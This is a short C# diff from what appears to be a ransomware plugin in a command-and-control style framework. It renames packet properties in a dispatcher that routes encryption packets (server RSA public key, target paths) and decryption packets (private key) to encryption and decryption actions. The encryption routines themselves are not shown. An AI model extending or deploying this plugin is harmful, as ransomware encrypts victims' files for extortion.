@@ -15,11 +15,11 @@ namespace Plugin
     {
         public static void Main(LoadingAPI loadingAPI)
         {
-            switch (loadingAPI.currentPacket.packetType)
+            switch (loadingAPI.CurrentPacket.PacketType)
             {
 
                 case PacketType.RANSOMWARE_ENCRYPTION:
-                    RansomwareEncryptionPacket ransomwareEncryptionPacket = (RansomwareEncryptionPacket)loadingAPI.currentPacket;
+                    RansomwareEncryptionPacket ransomwareEncryptionPacket = (RansomwareEncryptionPacket)loadingAPI.CurrentPacket;
                     ActionEncryption encryption = new ActionEncryption(
                         ransomwareEncryptionPacket.publicRSAServerKey,
                         ransomwareEncryptionPacket.paths,
@@ -31,7 +31,7 @@ namespace Plugin
                     break;
 
                 case PacketType.RANSOMWARE_DECRYPTION:
-                    RansomwareDecryptionPacket ransomwareDecryptionPacket = (RansomwareDecryptionPacket)loadingAPI.currentPacket;
+                    RansomwareDecryptionPacket ransomwareDecryptionPacket = (RansomwareDecryptionPacket)loadingAPI.CurrentPacket;
                     ActionDecryption decryption = new ActionDecryption(
                         ransomwareDecryptionPacket.privateRSAServerKey
                         );
